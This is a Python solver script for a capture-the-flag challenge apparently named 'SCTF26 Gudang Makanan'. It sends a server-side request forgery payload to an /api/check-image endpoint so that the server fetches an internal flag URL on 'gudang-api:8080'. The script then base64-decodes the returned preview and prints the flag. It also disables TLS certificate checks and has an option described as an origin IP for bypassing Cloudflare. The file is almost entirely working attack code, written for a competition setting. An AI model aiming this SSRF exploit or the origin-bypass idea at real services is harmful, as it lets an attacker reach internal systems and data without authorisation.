#!/usr/bin/env python3

import argparse
import base64
import json
import sys

import requests


def build_parser():
    parser = argparse.ArgumentParser(description="Solver for SCTF26 Gudang Makanan")
    parser.add_argument(
        "--host",
        default="gudang.sctf.my.id",
        help="Target host header / TLS server name",
    )
    parser.add_argument(
        "--origin-ip",
        default="103.127.98.249",
        help="Origin IP used to bypass Cloudflare",
    )
    parser.add_argument(
        "--origin-port",
        default=443,
        type=int,
        help="Origin HTTPS port",
    )
    parser.add_argument(
        "--payload-url",
        default="http://gudang-api:8080/Internal/Flag.jpg",
        help="SSRF payload URL",
    )
    parser.add_argument(
        "--timeout",
        default=10,
        type=int,
        help="Request timeout in seconds",
    )
    return parser


def decode_preview(preview):
    if "," not in preview:
        raise ValueError("Invalid preview format")
    return base64.b64decode(preview.split(",", 1)[1]).decode("utf-8", "replace")


def main():
    args = build_parser().parse_args()

    target_url = f"https://{args.host}:{args.origin_port}/api/check-image"
    session = requests.Session()
    session.trust_env = False

    try:
        response = session.post(
            target_url,
            json={"url": args.payload_url},
            headers={"Host": args.host},
            timeout=args.timeout,
            verify=False,
        )
    except requests.RequestException as exc:
        print(f"[!] Request failed: {exc}", file=sys.stderr)
        return 1

    try:
        data = response.json()
    except ValueError:
        print("[!] Target did not return JSON", file=sys.stderr)
        print(response.text)
        return 1

    if not data.get("success"):
        print("[!] Exploit failed:", data, file=sys.stderr)
        return 1

    preview = data["data"].get("preview", "")
    raw = decode_preview(preview)

    print("[+] Raw internal response:")
    print(raw)

    try:
        parsed = json.loads(raw)
    except ValueError:
        return 0

    flag = parsed.get("flag")
    if flag:
        print(f"\n[+] Flag: {flag}")

    return 0


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    raise SystemExit(main())
